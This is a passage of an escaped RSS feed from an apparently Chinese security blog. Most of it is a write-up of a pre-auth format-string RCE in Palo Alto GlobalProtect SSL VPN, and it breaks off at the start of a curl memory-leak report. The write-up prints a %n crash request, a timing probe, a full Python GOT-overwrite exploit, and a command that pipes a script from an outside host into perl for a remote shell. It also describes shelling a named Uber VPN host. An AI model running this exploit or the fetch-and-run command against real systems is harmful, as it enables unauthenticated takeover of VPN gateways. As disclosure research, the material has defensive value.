&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;/clientcert-response&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;在参数提取过程中，守护进程会搜索字符串scep-profile-name并将其值作为snprintf格式字符串来填充缓冲区，导致格式字符串攻击。使用%n即可使服务崩溃：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;POST&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;/sslmgr&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;global-protect&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;36&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;scep-profile-name=%n%n%n%n%n...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;受影响版本&#34;&gt;受影响版本
&lt;/h2&gt;&lt;p&gt;根据我们的调查，2018年7月之前的所有GlobalProtect版本均受影响：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Palo Alto GlobalProtect SSL VPN 7.1.x &amp;lt; 7.1.19&lt;/li&gt;
&lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.0.x &amp;lt; 8.0.12&lt;/li&gt;
&lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.1.x &amp;lt; 8.1.3&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;9.x和7.0.x系列不受此漏洞影响。&lt;/p&gt;
&lt;h2 id=&#34;漏洞验证方法&#34;&gt;漏洞验证方法
&lt;/h2&gt;&lt;p&gt;虽然我们知道漏洞位置，但验证并不容易。该格式字符串没有输出，我们无法通过地址泄露来验证。我们选择使用%c作为验证工具：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; curl -s -d &lt;span class=&#34;s1&#34;&gt;&amp;#39;scep-profile-name=%9999999c&amp;#39;&lt;/span&gt; https://global-protect/sslmgr &amp;gt;/dev/null
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;real    0m1.721s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user    0m0.037s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sys     0m0.005s
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;随着%c数量的增加，响应时间相应延长，从而优雅地识别出存在漏洞的SSL VPN。&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用
&lt;/h2&gt;&lt;p&gt;确定具体版本后，我们通过修改Global Offset Table(GOT)中的strlen指针为system的Procedure Linkage Table(PLT)地址来实现利用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/python&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://sslvpn/sslmgr&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;echo pwned &amp;gt; /var/appweb/sslvpndocs/hacked.txt&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;strlen_GOT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x667788&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 需修改&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system_plt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x445566&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 需修改&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;s1&#34;&gt;&amp;#39;%70$n&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;%&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system_plt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;%32$hn&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;%&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system_plt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xffff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system_plt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;%24$hn&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;%&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;$p&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;scep-profile-name=&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp;appauthcookie=&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp;host-id=&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp;user-email=&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp;appauthcookie=&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;修改完成后，sslmgr就成为我们的webshell，可以通过以下方式执行命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ curl -d &lt;span class=&#34;s1&#34;&gt;&amp;#39;scep-profile-name=curl orange.tw/bc.pl | perl -&amp;#39;&lt;/span&gt; https://global-protect/sslmgr
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;uber案例分析&#34;&gt;Uber案例分析
&lt;/h2&gt;&lt;p&gt;在我们确认这不是0day后，调查了全球使用存在漏洞GlobalProtect的大型企业，Uber是其中之一。以vpn.awscorp.uberinternal.com为例：&lt;/p&gt;
&lt;p&gt;从域名推测Uber使用AWS Marketplace的BYOL服务。从登录页面看似乎是8.x版本，最终我们确定版本为8.0.6并成功获取shell。&lt;/p&gt;
&lt;p&gt;Uber迅速响应并修复了漏洞，他们给出了详细的漏洞奖励决定说明：&lt;/p&gt;
&lt;p&gt;&amp;ldquo;虽然这是一个无需认证的RCE，但由于该Palo Alto SSL VPN不是员工使用的主要VPN，且部署在AWS而非核心基础设施中，因此整体影响和位置优势较低。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;我们享受整个研究过程并向安全社区反馈，这比漏洞奖励更有价值！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>curl库doh_write_cb函数内存泄漏漏洞分析</title>
        <link>http://localhost:1313/p/curl%E5%BA%93doh_write_cb%E5%87%BD%E6%95%B0%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 01:29:19 +0800</pubDate>
        
        <guid>http://localhost:1313/p/curl%E5%BA%93doh_write_cb%E5%87%BD%E6%95%B0%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;内存泄漏来自doh_write_cb函数&#34;&gt;内存泄漏来自doh_write_cb函数
&lt;/h1&gt;&lt;h2 id=&#34;漏洞摘要&#34;&gt;漏洞摘要
&lt;/h2&gt;&lt;p&gt;curl_fuzzer_http发现了一个内存泄漏问题&lt;/p&gt;
&lt;h2 id=&#34;受影响版本&#34;&gt;受影响版本
&lt;/h2&gt;&lt;p&gt;curl 8.13.0-DEV (x86_64-apple-darwin23.6.0)&lt;br&gt;
libcurl/8.13.0-DEV OpenSSL/1.0.2n zlib/1.2.11 libidn2/2.0.4 libpsl/0.19.1 nghttp2/1.55.1 librtmp/2.3&lt;br&gt;
发布日期: [未发布]&lt;br&gt;
协议支持: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp ws wss&lt;br&gt;
功能特性: alt-svc AsynchDNS HSTS HTTP2 HTTPS-proxy IDN IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP UnixSockets&lt;/p&gt;
&lt;h2 id=&#34;复现步骤&#34;&gt;复现步骤
&lt;/h2&gt;&lt;p&gt;使用复现程序运行fuzzer&lt;/p&gt;
&lt;h2 id=&#34;支持材料参考&#34;&gt;支持材料/参考
&lt;/h2&gt;&lt;p&gt;堆栈跟踪如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ERROR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LeakSanitizer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;detected&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memory&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;leaks&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
